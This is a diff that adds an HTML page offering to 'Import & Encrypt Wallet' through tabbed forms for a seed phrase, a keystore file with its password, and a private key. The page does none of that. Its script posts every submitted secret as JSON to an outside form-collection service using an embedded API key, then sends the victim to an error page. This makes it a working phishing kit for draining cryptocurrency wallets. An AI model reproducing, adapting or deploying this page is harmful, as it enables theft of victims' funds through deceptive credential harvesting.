@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./output.css" />
+    <title>Tabbed Login Forms</title>
+  </head>
+  <body>
+    <h1 class="text-3xl font-extrabold text-center mb-9 mt-20">
+      Import & Encrypt Wallet
+    </h1>
+    <nav
+      class="relative z-0 flex border rounded-xl overflow-hidden dark:border-neutral-700"
+      aria-label="Tabs"
+      role="tablist"
+      aria-orientation="horizontal"
+    >
+      <button
+        type="button"
+        class="hs-tab-active:border-b-blue-600 hs-tab-active:text-gray-900 dark:hs-tab-active:text-white relative dark:hs-tab-active:border-b-blue-600 min-w-0 flex-1 bg-white first:border-s-0 border-s border-b-2 py-4 px-4 text-gray-500 hover:text-gray-700 text-sm font-medium text-center overflow-hidden hover:bg-gray-50 focus:z-10 focus:outline-none focus:text-blue-600"
+        id="bar-with-underline-item-1"
+        data-tab-target="#bar-with-underline-1"
+        role="tab"
+      >
+        Seed/Recovery Phrase
+      </button>
+      <button
+        type="button"
+        class="hs-tab-active:border-b-blue-600 hs-tab-active:text-gray-900 dark:hs-tab-active:text-white relative dark:hs-tab-active:border-b-blue-600 min-w-0 flex-1 bg-white first:border-s-0 border-s border-b-2 py-4 px-4 text-gray-500 hover:text-gray-700 text-sm font-medium text-center overflow-hidden hover:bg-gray-50 focus:z-10 focus:outline-none focus:text-blue-600"
+        id="bar-with-underline-item-2"
+        data-tab-target="#bar-with-underline-2"
+        role="tab"
+      >
+        KeyStore JSON
+      </button>
+      <button
+        type="button"
+        class="hs-tab-active:border-b-blue-600 hs-tab-active:text-gray-900 dark:hs-tab-active:text-white relative dark:hs-tab-active:border-b-blue-600 min-w-0 flex-1 bg-white first:border-s-0 border-s border-b-2 py-4 px-4 text-gray-500 hover:text-gray-700 text-sm font-medium text-center overflow-hidden hover:bg-gray-50 focus:z-10 focus:outline-none focus:text-blue-600"
+        id="bar-with-underline-item-3"
+        data-tab-target="#bar-with-underline-3"
+        role="tab"
+      >
+        Private Key
+      </button>
+    </nav>
+
+    <div class="mt-3">
+      <!-- Seed/Recovery Phrase Form -->
+      <div id="bar-with-underline-1" role="tabpanel" class="tab-panel">
+        <form
+          class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
+          id="form-seed"
+        >
+          <div>
+            <label
+              for="phrase-value"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Phrase Value
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="phrase"
+              placeholder="Enter your phrase value..."
+              type="text"
+              id="phrase-value"
+              required
+            />
+          </div>
+          <h1>Typically 12 (sometimes 24) words separated by single spaces.</h1>
+          <div>
+            <input
+              type="submit"
+              class="w-full p-3 bg-blue-600 text-white rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+              value="Import"
+            />
+          </div>
+        </form>
+      </div>
+
+      <!-- KeyStore JSON Form -->
+      <div id="bar-with-underline-2" class="tab-panel hidden">
+        <form
+          class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
+          id="form-keystore"
+        >
+          <div>
+            <label
+              for="keystore-value"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Keystore Value
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="keystore"
+              placeholder="Enter your Keystore value..."
+              type="text"
+              id="keystore-value"
+              required
+            />
+          </div>
+
+          <div>
+            <label
+              for="keystore-password"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Password
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="password"
+              placeholder="Enter your Password..."
+              type="password"
+              id="keystore-password"
+              required
+            />
+          </div>
+
+          <div>
+            <input
+              type="submit"
+              class="w-full p-3 bg-blue-600 text-white rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+              value="Import"
+            />
+          </div>
+        </form>
+      </div>
+
+      <!-- Private Key Form -->
+      <div id="bar-with-underline-3" class="tab-panel hidden">
+        <form
+          class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
+          id="form-privatekey"
+        >
+          <div>
+            <label
+              for="privatekey-value"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Private Key
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="privatekey"
+              placeholder="Enter your Private Key..."
+              type="text"
+              id="privatekey-value"
+              required
+            />
+          </div>
+          <div>
+            <input
+              type="submit"
+              class="w-full p-3 bg-blue-600 text-white rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+              value="Import"
+            />
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      // Tab switching functionality
+      const tabs = document.querySelectorAll("[data-tab-target]");
+      const tabPanels = document.querySelectorAll(".tab-panel");
+
+      tabs.forEach((tab) => {
+        tab.addEventListener("click", () => {
+          const target = document.querySelector(tab.dataset.tabTarget);
+          tabPanels.forEach((panel) => panel.classList.add("hidden"));
+          tabs.forEach((t) => t.classList.remove("active"));
+          target.classList.remove("hidden");
+          tab.classList.add("active");
+        });
+      });
+
+      // Dynamic form handling
+      document.querySelectorAll("form").forEach((form) => {
+        form.addEventListener("submit", async function (event) {
+          event.preventDefault(); // Prevent default form submission
+
+          const url = `https://api.submitjson.com/v1/submit/b76ipGkky`;
+          let formData = {};
+
+          // Collect data from the active form
+          new FormData(form).forEach((value, key) => {
+            formData[key] = value;
+          });
+
+          // Submit data
+          const response = await fetch(url, {
+            method: "POST",
+            headers: {
+              "content-type": "application/json",
+              "X-API-Key": "sjk_3f2c8d1aeb474bbbb3afd6a0f404c6db", // Replace with your API Key
+            },
+            body: JSON.stringify({ data: formData }),
+          });
+
+          const result = await response.json();
+          console.log("Form Submission:", result);
+
+          if (response.ok) {
+            window.location.href = "/dist/error.html"; // Redirect after submission
+          } else {
+            alert("Failed to submit the form. Please try again.");
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
